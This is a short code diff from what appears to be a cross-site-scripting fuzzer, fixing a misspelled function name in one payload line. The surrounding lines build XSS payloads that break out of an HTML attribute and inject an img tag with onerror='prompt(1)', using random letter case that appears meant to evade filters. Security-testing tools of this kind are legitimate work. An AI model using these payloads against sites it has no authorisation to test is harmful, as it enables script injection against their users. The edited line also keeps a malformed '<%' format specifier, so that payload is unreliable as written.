@@ -298,7 +298,7 @@ paramFuzzTask = func(threads, url, param) {
                 payload = sprintf("\"></%s><%s id='%s' src=1 onerror='prompt(1)'><%s %s=\"", xhtml.RandomUpperAndLower(matchNode.TagName), xhtml.RandomUpperAndLower("img"), verifyRandStr, xhtml.RandomUpperAndLower(matchNode.TagName), matchNode.Key)
                 payloads = append(payloads, newPayload(payload, "<>/", "attr"))
 
-                payload = sprintf("'></%s><% id='%s' src=1 onerror='prompt(1)'><%s %s='", xhtml.RandomUpperAndLower(matchNode.TagName), xhtml.RandomUpperAndLower("img"), verifyRandStr, xhtml.RandomUppesrAndLower(matchNode.TagName), matchNode.Key)
+                payload = sprintf("'></%s><% id='%s' src=1 onerror='prompt(1)'><%s %s='", xhtml.RandomUpperAndLower(matchNode.TagName), xhtml.RandomUpperAndLower("img"), verifyRandStr, xhtml.RandomUpperAndLower(matchNode.TagName), matchNode.Key)
                 payloads = append(payloads, newPayload(payload, "<>/", "attr"))
 
                 payload = sprintf("></%s><%s id='%s' src=1 onerror='prompt(1)'><%s %s=", xhtml.RandomUpperAndLower(matchNode.TagName), xhtml.RandomUpperAndLower("img"), verifyRandStr, xhtml.RandomUpperAndLower(matchNode.TagName), matchNode.Key)
